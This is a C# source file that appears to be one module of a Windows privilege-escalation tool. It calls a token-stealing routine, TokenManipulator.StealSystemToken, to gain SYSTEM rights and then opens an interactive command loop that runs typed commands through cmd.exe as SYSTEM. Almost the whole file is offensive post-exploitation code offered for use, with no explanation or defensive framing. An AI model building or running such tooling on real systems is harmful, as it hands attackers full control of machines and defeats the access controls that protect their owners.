using System;
using System.Diagnostics;

namespace KernelMode.Privilege
{
    public static class SystemShell
    {
        public static void Start()
        {
            Console.WriteLine("[*] Attempting to start an interactive SYSTEM shell...");

            // First, ensure we have SYSTEM privileges.
            if (!TokenManipulator.StealSystemToken())
            {
                Console.WriteLine("[-] Failed to elevate to SYSTEM. Cannot start shell.");
                return;
            }

            Console.WriteLine("[+] Privileges elevated. Starting interactive SYSTEM shell.");
            Console.WriteLine("Type 'exit' to return to the main menu.");
            Console.WriteLine();

            while (true)
            {
                Console.Write($"{Environment.CurrentDirectory}>");
                string command = Console.ReadLine();

                if (string.IsNullOrWhiteSpace(command))
                {
                    continue;
                }

                if (command.Trim().ToLower() == "exit")
                {
                    break;
                }

                var startInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                try
                {
                    using (var process = Process.Start(startInfo))
                    {
                        // Read output and error streams synchronously
                        string output = process.StandardOutput.ReadToEnd();
                        string error = process.StandardError.ReadToEnd();

                        process.WaitForExit();

                        if (!string.IsNullOrEmpty(output))
                        {
                            Console.WriteLine(output);
                        }
                        if (!string.IsNullOrEmpty(error))
                        {
                            Console.Error.WriteLine(error);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Error executing command: {ex.Message}");
                }
            }

            Console.WriteLine("[*] Exited SYSTEM shell.");
        }
    }
}